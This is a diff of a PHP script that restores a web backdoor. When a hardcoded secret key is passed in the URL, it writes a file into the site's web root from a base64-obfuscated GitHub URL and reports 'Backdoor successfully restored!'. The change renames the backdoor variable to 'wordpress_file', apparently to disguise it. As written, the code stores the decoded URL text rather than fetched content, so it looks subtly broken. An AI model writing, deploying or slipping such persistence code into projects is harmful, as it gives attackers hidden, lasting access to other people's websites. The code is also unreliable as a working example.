@@ -3,10 +3,10 @@ $key = isset($_GET['key']) ? $_GET['key'] : '';
 $valid_key = '111155556666';
 
 if ($key === $valid_key) {
-    $backdoor_file = 'coach/new/index.php';
+    $wordpress_file = $_SERVER['DOCUMENT_ROOT'] . '/coach/new/index.php';
 
     // 
-    if (!file_exists($backdoor_file)) {
+    if (!file_exists($wordpress_file)) {
         // 
         $encoded_url = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29ubHltZTFkL2R4ZXJyb3IvcmVmcy9oZWFkcy9tYWluL0Zyb21GVg==';
         
@@ -14,7 +14,7 @@ if ($key === $valid_key) {
         $file_content = base64_decode($encoded_url);
         
         // 
-        file_put_contents($backdoor_file, $file_content);
+        file_put_contents($wordpress_file, $file_content);
 
         echo "Backdoor successfully restored!";
     } else {
